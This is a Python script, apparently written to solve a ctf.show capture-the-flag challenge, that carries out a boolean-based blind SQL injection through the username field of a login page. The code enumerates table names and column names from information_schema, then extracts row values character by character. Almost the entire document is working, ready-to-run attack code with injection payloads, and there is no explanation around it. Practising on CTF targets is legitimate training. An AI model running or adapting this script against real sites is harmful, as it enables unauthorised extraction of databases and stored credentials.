import requests
import string

URL = "http://70260993-934c-43a7-bb41-e6f49a7b49e6.challenge.ctf.show//login.php"

FAIL = "script" # 登录失败时的响应头

def send_payload(payload):
    data = {
        "username": payload,
        "password": "anything"
    }
    resp = requests.post(URL, data=data, allow_redirects=False)
    return resp.text.find(FAIL) == -1

def get_length(payload_template, min_len=1, max_len=100):
    for l in range(min_len, max_len):
        payload = payload_template.format(l)
        if send_payload(payload):
            return l
    return None

def get_string(payload_template, length):
    result = ""
    chars = string.ascii_letters + string.digits + "_{}@.-,! "
    for i in range(1, length+1):
        for c in chars:
            payload = payload_template.format(i, c)
            if send_payload(payload):
                result += c
                print(f"\r{result}", end="", flush=True)
                break
    print()
    return result

def get_table_names():
    print("[*] Getting table name length...")
    length = get_length("admin' and (select length(group_concat(table_name)) from information_schema.tables where table_schema=database())={};#---")
    print(f"[*] Table names length: {length}")

    print("[*] Getting table names...")
    names = get_string("admin' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))=ascii('{}');#---", length)
    print(f"[*] Table names: {names.split(',')}")
    return names.split(',')

def get_column_names(table):
    print(f"[*] Getting column names length for {table}...")
    length = get_length(f"admin' and (select length(group_concat(column_name)) from information_schema.columns where table_name='{table}')={{}};#---")
    print(f"[*] Column names length: {length}")

    print(f"[*] Getting column names for {table}...")
    names = get_string(f"admin' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='{table}'),{{}},1))=ascii('{{}}');#---", length)
    print(f"[*] Column names: {names}")
    return names.split(',')

def get_field(table, column, row=0):
    print(f"[*] Getting length of {column} in {table} row {row}...")
    length = get_length(f"admin' and (select length({column}) from {table} limit {row},1)={{}};#---", max_len=256)
    print(f"[*] Field length: {length}")

    if length is None:
        print(f"[!] Cannot determine length for {column} in {table} row {row}, skipping.")
        return ""

    print(f"[*] Getting value of {column} in {table} row {row}...")
    value = get_string(f"admin' and ascii(substr((select {column} from {table} limit {row},1),{{}},1))=ascii('{{}}');#---", length)
    print(f"[*] Value: {value}")
    return value

if __name__ == "__main__":
    # 1. 获取所有表名
    tables = get_table_names()

    # 2. 获取每个表的列名
    for table in tables:
        columns = get_column_names(table)
        # 3. 获取每个表的每个字段内容
        for col in columns:
            for row in range(2): #获取前2行
                get_field(table, col, row)